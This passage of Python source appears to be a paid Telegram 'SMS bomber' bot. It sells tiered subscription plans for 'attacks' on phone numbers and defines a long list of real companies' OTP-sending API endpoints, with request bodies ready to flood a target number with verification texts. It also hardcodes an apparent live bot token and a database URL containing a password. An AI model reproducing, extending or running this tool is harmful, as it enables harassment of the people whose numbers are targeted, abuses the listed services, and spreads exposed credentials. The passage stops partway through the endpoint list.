import sys
import types
import ssl
import re
import os
import json
import logging
import asyncio
import aiohttp
import time
import random
import string
import signal
from datetime import datetime, timedelta

# ========== DATABASE IMPORTS ==========
# FIX: Use PostgreSQL instead of SQLite
try:
    import asyncpg
    HAS_ASYNCPG = True
except ImportError:
    HAS_ASYNCPG = False

try:
    import aiosqlite
    import sqlite3
    HAS_SQLITE = True
except ImportError:
    HAS_SQLITE = False

# ========== LOGGING ==========
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ========== CGI FIX (for older python-telegram-bot) ==========
if 'cgi' not in sys.modules:
    class CGI:
        def parse_multipart(self, *args, **kwargs):
            return {}
        class FieldStorage:
            def __init__(self, *args, **kwargs):
                self.value = None
                self.filename = None
                self.file = None
                self.type = None
                self.headers = {}
            def __getattr__(self, name):
                return None

    cgi_module = types.ModuleType('cgi')
    cgi_module.parse_multipart = CGI().parse_multipart
    cgi_module.FieldStorage = CGI.FieldStorage
    sys.modules['cgi'] = cgi_module

# ========== HTTPX FIX ==========
import httpx
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)

try:
    _original_async_client_init = httpx.AsyncClient.__init__
    def _patched_async_client_init(self, *args, **kwargs):
        # Remove deprecated params
        kwargs.pop('proxy', None)
        kwargs.pop('http1', None)
        kwargs.pop('http2', None)
        kwargs.pop('verify', None)
        kwargs.pop('cert', None)
        kwargs.pop('trust_env', None)
        # Handle proxies vs proxy
        if 'proxies' in kwargs and kwargs['proxies'] is None:
            kwargs.pop('proxies')
        _original_async_client_init(self, *args, **kwargs)
    httpx.AsyncClient.__init__ = _patched_async_client_init
except Exception as e:
    logger.warning(f"httpx patch failed: {e}")

from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler

# ========== ENV ==========
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8495053693:AAFGI4W46SWbwpTGQApsIBhdvi0dTVHtOe4")
OWNER_ID = int(os.environ.get("OWNER_ID", 8128821116))
ADMIN_ID = int(os.environ.get("ADMIN_ID", 8128821116))
WELCOME_IMAGE = os.environ.get("WELCOME_IMAGE", "https://kommodo.ai/i/wqVc4u68cErtebyE6okA")
PORT = int(os.environ.get("PORT", 8080))
WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "")
USE_WEBHOOK = os.environ.get("USE_WEBHOOK", "false").lower() == "true"

# FIX: Use PostgreSQL URL from env, fallback to SQLite
DATABASE_URL = os.environ.get(
    "DATABASE_URL",
    "postgres://u2psmt0rtf487d:p3acf445162b293321536b849173a681d035468539eefea97c94f624746d179f3@c2m7qldd7t9j38.cluster-czrs8kj4isg7.us-east-1.rds.amazonaws.com:5432/dfkbivehqdd646"
)

# Heroku sometimes uses postgres:// (old), asyncpg needs postgresql://
if DATABASE_URL.startswith("postgres://"):
    DATABASE_URL = DATABASE_URL.replace("postgres://", "postgresql://", 1)

DB_PATH = os.environ.get("DB_PATH", os.path.join(os.path.dirname(os.path.abspath(__file__)), "rolexbomber.db"))

PLANS = {
    "standard": {"name": "Standard", "price": 149, "days": 30, "concurrent": 2, "max_duration": 300},
    "premium": {"name": "Premium", "price": 249, "days": 30, "concurrent": 5, "max_duration": 720},
    "ultimate": {"name": "Ultimate", "price": 349, "days": 30, "concurrent": 10, "max_duration": 720}
}


# ============================================================
# FIXED DATABASE STORAGE - Supports both PostgreSQL and SQLite
# ============================================================
class DatabaseStorage:
    def __init__(self, database_url=None, sqlite_path=None):
        self.database_url = database_url
        self.sqlite_path = sqlite_path
        self.use_postgres = False
        self._pool = None
        self._conn = None
        self.temp_attack_data = {}

        if database_url and HAS_ASYNCPG:
            self.use_postgres = True
        elif sqlite_path and HAS_SQLITE:
            self.use_postgres = False
            d = os.path.dirname(os.path.abspath(sqlite_path))
            if d and not os.path.exists(d):
                os.makedirs(d, exist_ok=True)

    # -------- Connection handling --------
    async def _get_pool(self):
        if self._pool is None:
            self._pool = await asyncpg.create_pool(
                self.database_url,
                min_size=1, max_size=10,
                command_timeout=30
            )
        return self._pool

    async def _get_sqlite_conn(self):
        if self._conn is None:
            self._conn = await aiosqlite.connect(self.sqlite_path)
            self._conn.row_factory = sqlite3.Row
        return self._conn

    async def _exec(self, sql, *params):
        """Execute INSERT/UPDATE/DELETE"""
        if self.use_postgres:
            # Convert ? to $1, $2, ... for asyncpg
            sql_pg = self._convert_placeholders(sql)
            pool = await self._get_pool()
            async with pool.acquire() as conn:
                return await conn.execute(sql_pg, *params)
        else:
            conn = await self._get_sqlite_conn()
            cur = await conn.execute(sql, params)
            await conn.commit()
            return cur

    async def _fetchone(self, sql, *params):
        if self.use_postgres:
            sql_pg = self._convert_placeholders(sql)
            pool = await self._get_pool()
            async with pool.acquire() as conn:
                row = await conn.fetchrow(sql_pg, *params)
                return dict(row) if row else None
        else:
            conn = await self._get_sqlite_conn()
            cur = await conn.execute(sql, params)
            row = await cur.fetchone()
            await cur.close()
            return dict(row) if row else None

    async def _fetchall(self, sql, *params):
        if self.use_postgres:
            sql_pg = self._convert_placeholders(sql)
            pool = await self._get_pool()
            async with pool.acquire() as conn:
                rows = await conn.fetch(sql_pg, *params)
                return [dict(r) for r in rows]
        else:
            conn = await self._get_sqlite_conn()
            cur = await conn.execute(sql, params)
            rows = await cur.fetchall()
            await cur.close()
            return [dict(r) for r in rows]

    @staticmethod
    def _convert_placeholders(sql):
        """Convert SQLite '?' placeholders to PostgreSQL '$1' style"""
        parts = sql.split('?')
        if len(parts) == 1:
            return sql
        result = parts[0]
        for i, part in enumerate(parts[1:], 1):
            result += f"${i}" + part
        return result

    # -------- Schema --------
    async def ensure_indexes(self):
        if self.use_postgres:
            pool = await self._get_pool()
            async with pool.acquire() as conn:
                await conn.execute("""
                    CREATE TABLE IF NOT EXISTS users (
                        user_id BIGINT PRIMARY KEY,
                        premium_expiry TEXT,
                        premium_plan TEXT DEFAULT 'standard',
                        protected_number TEXT,
                        created_at TEXT
                    )
                """)
                await conn.execute("""
                    CREATE TABLE IF NOT EXISTS redeem_codes (
                        code TEXT PRIMARY KEY,
                        days INTEGER,
                        plan_type TEXT,
                        is_used INTEGER DEFAULT 0,
                        created_at TEXT
                    )
                """)
                await conn.execute("""
                    CREATE TABLE IF NOT EXISTS settings (
                        key TEXT PRIMARY KEY,
                        value TEXT
                    )
                """)
                await conn.execute("""
                    CREATE TABLE IF NOT EXISTS contact_messages (
                        id SERIAL PRIMARY KEY,
                        user_id BIGINT,
                        message TEXT,
                        status TEXT DEFAULT 'pending',
                        created_at TEXT,
                        replied_at TEXT,
                        reply_text TEXT
                    )
                """)
                await conn.execute("""
                    CREATE TABLE IF NOT EXISTS contact_blocked (
                        user_id BIGINT PRIMARY KEY,
                        blocked_at TEXT
                    )
                """)
        else:
            conn = await self._get_sqlite_conn()
            await conn.execute("CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, premium_expiry TEXT, premium_plan TEXT DEFAULT 'standard', protected_number TEXT, created_at TEXT)")
            await conn.execute("CREATE TABLE IF NOT EXISTS redeem_codes (code TEXT PRIMARY KEY, days INTEGER, plan_type TEXT, is_used INTEGER DEFAULT 0, created_at TEXT)")
            await conn.execute("CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT)")
            await conn.execute("CREATE TABLE IF NOT EXISTS contact_messages (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, message TEXT, status TEXT DEFAULT 'pending', created_at TEXT, replied_at TEXT, reply_text TEXT)")
            await conn.execute("CREATE TABLE IF NOT EXISTS contact_blocked (user_id INTEGER PRIMARY KEY, blocked_at TEXT)")
            await conn.commit()

    # -------- User methods --------
    async def get_user(self, user_id):
        return await self._fetchone("SELECT * FROM users WHERE user_id = ?", int(user_id))

    async def add_user(self, user_id):
        if not await self.get_user(user_id):
            try:
                await self._exec(
                    "INSERT INTO users (user_id, premium_expiry, premium_plan, protected_number, created_at) VALUES (?,?,?,?,?)",
                    int(user_id), None, "standard", None, datetime.now().isoformat()
                )
            except Exception:
                pass
        return True

    async def is_premium(self, user_id):
        if user_id == OWNER_ID:
            return True
        user = await self.get_user(user_id)
        if user and user.get("premium_expiry"):
            try:
                return datetime.now() < datetime.fromisoformat(user["premium_expiry"])
            except Exception:
                return False
        return False

    async def get_concurrent_limit(self, user_id):
        if user_id == OWNER_ID:
            return 10
        user = await self.get_user(user_id)
        if user and user.get("premium_expiry"):
            try:
                if datetime.now() < datetime.fromisoformat(user["premium_expiry"]):
                    return PLANS.get(user.get("premium_plan", "standard"), PLANS["standard"])["concurrent"]
            except Exception:
                pass
        return 0

    async def get_max_duration(self, user_id):
        if user_id == OWNER_ID:
            return 720
        user = await self.get_user(user_id)
        if user and user.get("premium_expiry"):
            try:
                if datetime.now() < datetime.fromisoformat(user["premium_expiry"]):
                    return PLANS.get(user.get("premium_plan", "standard"), PLANS["standard"])["max_duration"]
            except Exception:
                pass
        return 0

    async def get_plan_name(self, user_id):
        if user_id == OWNER_ID:
            return "Ultimate"
        user = await self.get_user(user_id)
        if user and user.get("premium_expiry"):
            try:
                if datetime.now() < datetime.fromisoformat(user["premium_expiry"]):
                    return PLANS.get(user.get("premium_plan", "standard"), PLANS["standard"])["name"]
            except Exception:
                pass
        return "Free"

    async def get_expiry(self, user_id):
        user = await self.get_user(user_id)
        if user and user.get("premium_expiry"):
            try:
                exp = datetime.fromisoformat(user["premium_expiry"])
                if datetime.now() < exp:
                    return user["premium_expiry"]
            except Exception:
                pass
        return "Not Active"

    async def add_premium(self, user_id, days, plan_type="standard"):
        current = datetime.now()
        user = await self.get_user(user_id)
        if user and user.get("premium_expiry"):
            try:
                stored = datetime.fromisoformat(user["premium_expiry"])
                if stored > current:
                    current = stored
            except Exception:
                pass
        new_exp = current + timedelta(days=days)
        str_exp = new_exp.isoformat()

        if self.use_postgres:
            await self._exec(
                """INSERT INTO users (user_id, premium_expiry, premium_plan, protected_number, created_at)
                   VALUES (?, ?, ?, NULL, ?)
                   ON CONFLICT(user_id) DO UPDATE
                   SET premium_expiry = EXCLUDED.premium_expiry,
                       premium_plan = EXCLUDED.premium_plan""",
                int(user_id), str_exp, plan_type, datetime.now().isoformat()
            )
        else:
            await self._exec(
                "INSERT INTO users (user_id, premium_expiry, premium_plan, protected_number, created_at) VALUES (?, ?, ?, NULL, ?)"
                " ON CONFLICT(user_id) DO UPDATE SET premium_expiry=excluded.premium_expiry, premium_plan=excluded.premium_plan",
                int(user_id), str_exp, plan_type, datetime.now().isoformat()
            )
        return str_exp

    async def remove_premium(self, user_id):
        await self._exec("UPDATE users SET premium_expiry = NULL, premium_plan = NULL WHERE user_id = ?", int(user_id))
        return True

    async def get_all_users_with_plan(self):
        return await self._fetchall("SELECT user_id, premium_expiry, premium_plan, protected_number, created_at FROM users ORDER BY created_at DESC")

    # -------- Redeem codes --------
    async def generate_code(self, days, plan_type="standard"):
        code = "PREMIUM-" + ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
        existing = await self._fetchone("SELECT code FROM redeem_codes WHERE code = ?", code)
        if existing:
            return await self.generate_code(days, plan_type)
        await self._exec(
            "INSERT INTO redeem_codes (code, days, plan_type, is_used, created_at) VALUES (?,?,?,?,?)",
            code, days, plan_type, 0, datetime.now().isoformat()
        )
        return code

    async def redeem(self, user_id, code):
        row = await self._fetchone("SELECT * FROM redeem_codes WHERE code = ?", code)
        if not row or row["is_used"] == 1:
            return False, 0, None, None
        days = row["days"] or 0
        plan_type = row["plan_type"] or "standard"
        await self._exec("UPDATE redeem_codes SET is_used = 1 WHERE code = ?", code)
        exp_date = await self.add_premium(user_id, days, plan_type)
        return True, days, plan_type, exp_date

    # -------- Protected numbers --------
    async def protect(self, user_id, number):
        await self._exec("UPDATE users SET protected_number = ? WHERE user_id = ?", number, int(user_id))

    async def unprotect(self, user_id):
        await self._exec("UPDATE users SET protected_number = NULL WHERE user_id = ?", int(user_id))

    async def is_protected(self, number):
        return (await self._fetchone("SELECT user_id FROM users WHERE protected_number = ?", number)) is not None

    # -------- Settings --------
    async def set_channel(self, channel_id):
        if self.use_postgres:
            await self._exec(
                "INSERT INTO settings (key, value) VALUES ('channel_id', ?) ON CONFLICT(key) DO UPDATE SET value = EXCLUDED.value",
                str(channel_id)
            )
        else:
            await self._exec(
                "INSERT INTO settings (key, value) VALUES ('channel_id', ?) ON CONFLICT(key) DO UPDATE SET value = excluded.value",
                str(channel_id)
            )

    async def get_channel(self):
        row = await self._fetchone("SELECT value FROM settings WHERE key = 'channel_id'")
        return str(row["value"]) if row and row["value"] else None

    async def remove_channel(self):
        await self._exec("DELETE FROM settings WHERE key = 'channel_id'")

    async def get_all_users(self):
        rows = await self._fetchall("SELECT user_id FROM users")
        return [r["user_id"] for r in rows]

    async def get_stats(self):
        row = await self._fetchone("SELECT COUNT(*) AS c FROM users")
        total = row["c"] if row else 0
        now = datetime.now().isoformat()
        row = await self._fetchone("SELECT COUNT(*) AS c FROM users WHERE premium_expiry > ?", now)
        premium = row["c"] if row else 0
        row = await self._fetchone("SELECT COUNT(*) AS c FROM redeem_codes")
        codes = row["c"] if row else 0
        row = await self._fetchone("SELECT COUNT(*) AS c FROM contact_messages WHERE status = 'pending'")
        pending = row["c"] if row else 0
        return total, premium, codes, pending

    # -------- Contact messages --------
    async def add_contact_message(self, user_id, message):
        if self.use_postgres:
            pool = await self._get_pool()
            async with pool.acquire() as conn:
                row = await conn.fetchrow(
                    "INSERT INTO contact_messages (user_id, message, status, created_at) VALUES ($1,$2,$3,$4) RETURNING id",
                    int(user_id), message, "pending", datetime.now().isoformat()
                )
                return row["id"] if row else None
        else:
            await self._exec(
                "INSERT INTO contact_messages (user_id, message, status, created_at) VALUES (?,?,?,?)",
                int(user_id), message, "pending", datetime.now().isoformat()
            )
            row = await self._fetchone("SELECT last_insert_rowid() AS id")
            return row["id"] if row else None

    async def get_pending_contacts(self):
        return await self._fetchall("SELECT * FROM contact_messages WHERE status = 'pending' ORDER BY created_at ASC")

    async def reply_contact_message(self, msg_id, reply_text):
        await self._exec(
            "UPDATE contact_messages SET status = 'replied', reply_text = ?, replied_at = ? WHERE id = ?",
            reply_text, datetime.now().isoformat(), msg_id
        )

    async def block_contact(self, user_id):
        if self.use_postgres:
            await self._exec(
                "INSERT INTO contact_blocked (user_id, blocked_at) VALUES (?,?) ON CONFLICT(user_id) DO UPDATE SET blocked_at = EXCLUDED.blocked_at",
                int(user_id), datetime.now().isoformat()
            )
        else:
            await self._exec(
                "INSERT OR REPLACE INTO contact_blocked (user_id, blocked_at) VALUES (?,?)",
                int(user_id), datetime.now().isoformat()
            )

    async def unblock_contact(self, user_id):
        await self._exec("DELETE FROM contact_blocked WHERE user_id = ?", int(user_id))

    async def is_contact_blocked(self, user_id):
        return (await self._fetchone("SELECT user_id FROM contact_blocked WHERE user_id = ?", int(user_id))) is not None

    async def get_blocked_users(self):
        rows = await self._fetchall("SELECT user_id FROM contact_blocked")
        return [r["user_id"] for r in rows]

    # -------- Attack temp data --------
    def set_attack_data(self, user_id, targets):
        self.temp_attack_data[user_id] = {'targets': targets, 'timestamp': time.time()}

    def get_attack_data(self, user_id):
        data = self.temp_attack_data.get(user_id)
        if data and time.time() - data['timestamp'] < 300:
            return data['targets']
        if user_id in self.temp_attack_data:
            del self.temp_attack_data[user_id]
        return None

    def clear_attack_data(self, user_id):
        if user_id in self.temp_attack_data:
            del self.temp_attack_data[user_id]

    async def close(self):
        if self._pool:
            await self._pool.close()
            self._pool = None
        if self._conn:
            await self._conn.close()
            self._conn = None


db = None


# ============================================================
# API LIST - ORIGINAL APIS
# ============================================================
def build_api_list():
    apis = []

    # ========== SMS APIs (kept from original) ==========
    sms = [
        {"name":"Lenskart_SMS","url":"https://api-gateway.juno.lenskart.com/v3/customers/sendOtp","method":"POST","headers":{"Content-Type":"application/json","X-API-Client":"mobilesite","X-Country-Code":"IN"},"body":{"captcha":None,"phoneCode":"+91","telephone":"{no}"}},
        {"name":"NoBroker_SMS","url":"https://www.nobroker.in/api/v3/account/otp/send","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded","Origin":"https://www.nobroker.in"},"body":"phone={no}&countryCode=IN"},
        {"name":"PharmEasy_SMS","url":"https://pharmeasy.in/api/v2/auth/send-otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}"}},
        {"name":"ShipRocket_SMS","url":"https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send","method":"POST","headers":{"Content-Type":"application/json","authorization":"Bearer null"},"body":{"mobileNumber":"{no}"}},
        {"name":"GoKwik_SMS","url":"https://gkx.gokwik.co/v3/gkstrict/auth/otp/send","method":"POST","headers":{"Content-Type":"application/json","gk-merchant-id":"19g6jlc658iad"},"body":{"phone":"{no}","country":"in"}},
        {"name":"Wakefit_SMS","url":"https://api.wakefit.co/api/consumer-sms-otp/","method":"POST","headers":{"Content-Type":"application/json","API-Secret-Key":"ycq55IbIjkLb"},"body":{"mobile":"{no}","whatsapp_opt_in":1}},
        {"name":"Hungama_OTP","url":"https://communication.api.hungama.com/v1/communication/otp","method":"POST","headers":{"Content-Type":"application/json","identifier":"home"},"body":{"mobileNo":"{no}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}},
        {"name":"Khatabook","url":"https://api.khatabook.com/v1/auth/request-otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}","app_signature":"wk+avHrHZf2"}},
        {"name":"Doubtnut_SMS","url":"https://api.doubtnut.com/v4/student/login","method":"POST","headers":{"Content-Type":"application/json; charset=utf-8"},"body":{"phone_number":"{no}","language":"en"}},
        {"name":"BeepKart_SMS","url":"https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}","city":362}},
        {"name":"Snitch_SMS","url":"https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2","method":"POST","headers":{"Content-Type":"application/json","client-id":"snitch_secret"},"body":{"mobile_number":"+91{no}"}},
        {"name":"RummyCircle_SMS","url":"https://www.rummycircle.com/api/fl/auth/v3/getOtp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}","isPlaycircle":False}},
        {"name":"PokerBaazi","url":"https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}","mfa_channels":"phno"}},
        {"name":"My11Circle","url":"https://www.my11circle.com/api/fl/auth/v3/getOtp","method":"POST","headers":{"Content-Type":"application/json;charset=UTF-8"},"body":{"mobile":"{no}"}},
        {"name":"Cosmofeed","url":"https://prod.api.cosmofeed.com/api/user/authenticate","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}","version":"1.4.28"}},
        {"name":"Dream11_SMS","url":"https://www.dream11.com/auth/passwordless/init","method":"POST","headers":{"Content-Type":"application/json"},"body":{"channel":"sms","flow":"SIGNUP","phoneNumber":"{no}","templateName":"default"}},
        {"name":"Dream11_Link","url":"https://api.dream11.com/sendsmslink","method":"POST","headers":{"Content-Type":"application/json"},"body":{"siteId":"1","mobileNum":"{no}","appType":"androidfull"}},
        {"name":"Unacademy_SMS","url":"https://unacademy.com/api/v3/user/user_check/","method":"POST","headers":{"Content-Type":"application/json; charset=utf-8"},"body":{"country_code":"IN","phone":"{no}","otp_type":2.0,"send_otp":True}},
        {"name":"Vedantu","url":"https://user.vedantu.com/user/preLoginVerification","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phoneNumber":"{no}","phoneCode":"+91"}},
        {"name":"Byjus_SMS","url":"https://bcas-prod.byjusweb.com/api/send-otp","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded"},"body":"phoneNumber={no}"},
        {"name":"Spinny_OTP","url":"https://api.spinny.com/api/c/user/otp-request/v3/","method":"POST","headers":{"Content-Type":"application/json"},"body":{"contact_number":"{no}","whatsapp":False,"code_len":4}},
        {"name":"Citymall_OTP","url":"https://citymall.live/api/cl-user/auth/get-otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone_number":"{no}"}},
        {"name":"Jobhai","url":"https://api.jobhai.com/auth/jobseeker/v3/send_otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}"}},
        {"name":"Kwikfix","url":"https://admin.kwikfixauto.in/api/auth/signupotp/","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}"}},
        {"name":"Brevistay","url":"https://www.brevistay.com/cst/app-api/login","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}"}},
        {"name":"Hourlyrooms","url":"https://web-api.hourlyrooms.co.in/api/signup/sendphoneotp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}"}},
        {"name":"Pagarbook","url":"https://api.pagarbook.com/api/v5/auth/otp/request","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}","language":1}},
        {"name":"Redcliffe","url":"https://api.redcliffelabs.com/api/v1/notification/send_otp/","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone_number":"{no}"}},
        {"name":"Woodenstreet","url":"https://api.woodenstreet.com/api/v1/register","method":"POST","headers":{"Content-Type":"application/json"},"body":{"telephone":"{no}"}},
        {"name":"Meru_Cab","url":"https://merucabapp.com/api/otp/generate","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded","DeviceType":"Android"},"body":"mobile_number={no}"},
        {"name":"PenPencil","url":"https://api.penpencil.co/v1/users/resend-otp?smsType=1","method":"POST","headers":{"Content-Type":"application/json; charset=utf-8"},"body":{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{no}"}},
        {"name":"Dayco_India","url":"https://ekyc.daycoindia.com/api/nscript_functions.php","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"},"body":"api=send_otp&brand=dayco&mob={no}&resend_otp=resend_otp"},
        {"name":"NewMe_SMS","url":"https://prodapi.newme.asia/web/otp/request","method":"POST","headers":{"Content-Type":"application/json","Caller":"web_app"},"body":{"mobile_number":"{no}","resend_otp_request":True}},
        {"name":"Smytten_SMS","url":"https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode","method":"POST","headers":{"Content-Type":"application/json","UUID":"8e6b1c3f-3d72-42af-89af-201b79dfdf2f"},"body":{"phone":"{no}","email":"sdhabai09@gmail.com"}},
        {"name":"CaratLane","url":"https://www.caratlane.com/cg/dhevudu","method":"POST","headers":{"Content-Type":"application/json","Authorization":"b945ebaf43ed7541d49cfd60bd82b81908edff8d465caecfe58deef209"},"body":{"query":"mutation { SendOtp( input: { mobile: \"{no}\", isdCode: \"91\", otpType: \"registerOtp\" } ) { status { message code } } }"}},
        {"name":"WellAcademy","url":"https://wellacademy.in/store/api/numberLoginV2","method":"POST","headers":{"Content-Type":"application/json; charset=UTF-8"},"body":{"contact_no":"{no}"}},
        {"name":"ServeTel","url":"https://api.servetel.in/v1/auth/otp","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded"},"body":"mobile_number={no}"},
        {"name":"Shemaroome","url":"https://www.shemaroome.com/users/resend_otp","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With":"XMLHttpRequest"},"body":"mobile_no=%2B91{no}"},
        {"name":"Otpless","url":"https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}","selectedCountryCode":"+91"}},
        {"name":"MyHubble","url":"https://api.myhubble.money/v1/auth/otp/generate","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phoneNumber":"{no}","channel":"SMS"}},
        {"name":"DealShare","url":"https://services.dealshare.in/userservice/api/v1/user-login/send-login-code","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}","hashCode":"k387IsBaTmn"}},
        {"name":"Snapmint","url":"https://api.snapmint.com/v1/public/sign_up","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}"}},
        {"name":"Housing_SMS","url":"https://login.housing.com/api/v2/send-otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}","country_url_name":"in"}},
        {"name":"RentoMojo","url":"https://www.rentomojo.com/api/RMUsers/isNumberRegistered","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}"}},
        {"name":"Netmeds","url":"https://apiv2.netmeds.com/mst/rest/v1/id/details/","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}"}},
        {"name":"Nykaa","url":"https://www.nykaa.com/app-api/index.php/customer/send_otp","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded"},"body":"source=sms&mobile_number={no}"},
        {"name":"Animall","url":"https://animall.in/zap/auth/login","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}","signupPlatform":"NATIVE_ANDROID"}},
        {"name":"Entri","url":"https://entri.app/api/v3/users/check-phone/","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}"}},
        {"name":"Revv","url":"https://st-core-admin.revv.co.in/stCore/api/customer/v1/init","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}","deviceType":"website"}},
        {"name":"Spencers","url":"https://jiffy.spencers.in/user/auth/otp/send","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}"}},
        {"name":"ShoppersStop","url":"https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}","type":"SIGNIN_WITH_MOBILE"}},
        {"name":"HealthMug","url":"https://api.healthmug.com/account/createotp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}"}},
        {"name":"TrulyMadly","url":"https://app.trulymadly.com/api/auth/mobile/v1/send-otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}","locale":"IN"}},
        {"name":"Apna","url":"https://production.apna.co/api/userprofile/v1/otp/","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}","hash_type":"play_store"}},
        {"name":"Swipe","url":"https://app.getswipe.in/api/user/mobile_login","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}","resend":True}},
        {"name":"Country_Delight","url":"https://api.countrydelight.in/api/v1/customer/requestOtp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}","platform":"Android","mode":"new_user"}},
        {"name":"Rapido_SMS","url":"https://customer.rapido.bike/api/otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}"}},
        {"name":"Mpokket","url":"https://web-api.mpokket.in/registration/sendOtp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}"}},
        {"name":"Charzer","url":"https://api.charzer.com/auth-service/send-otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}","appSource":"CHARZER_APP"}},
        {"name":"BikeFixup","url":"https://api.bikefixup.com/api/v2/send-registration-otp","method":"POST","headers":{"Content-Type":"application/json; charset=UTF-8","client":"app"},"body":{"phone":"{no}","app_signature":"4pFtQJwcz6y"}},
        {"name":"Licious","url":"https://www.licious.in/api/login/signup","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}","captcha_token":None}},
        {"name":"CureFoods","url":"https://web.curefoods.com/api/v2/auth/send-otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}","country_code":"+91"}},
        {"name":"Puma","url":"https://in.puma.com/on/demandware.store/Sites-IN-Site/en_IN/Login-OtpRegistration","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded"},"body":"dwfrm_phone={no}&format=ajax"},
        {"name":"Decathlon","url":"https://www.decathlon.in/api/v1/auth/sendOTP","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}","isLogin":True}},
        {"name":"McDonalds","url":"https://mcdelivery.mcdonaldsindia.com/api/v1/customer/otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phoneNumber":"{no}","source":"web"}},
        {"name":"Dominos","url":"https://pizzaonline.dominos.co.in/api/v1/auth/sendOtp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}","source":"WEB"}},
        {"name":"Zivame","url":"https://www.zivame.com/auth/public/v1/otp/send","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}","countryCode":"IN"}},
        {"name":"FirstCry","url":"https://www.firstcry.com/api/v2/auth/sendOtp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}"}},
        {"name":"Tata1mg","url":"https://www.1mg.com/auth_api/v6/create_token","method":"POST","headers":{"Content-Type":"application/json"},"body":{"number":"{no}","login_with":"mobile"}},
        {"name":"Upstox","url":"https://api.upstox.com/v2/login/otp/send","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}","client_id":"UPSTOX"}},
        {"name":"Zerodha","url":"https://kite.zerodha.com/api/login","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded"},"body":"user_id={no}"},
        {"name":"Groww","url":"https://groww.in/api/v2/auth/otp/send","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}","platform":"WEB"}},
        {"name":"SonyLiv_SMS","url":"https://www.sonyliv.com/api/v1/auth/sendOTP","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}","countryCode":"+91"}},
        {"name":"BookMyShow","url":"https://in.bmscdn.com/mjson/User/SendOTP","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobileNo":"{no}"}},
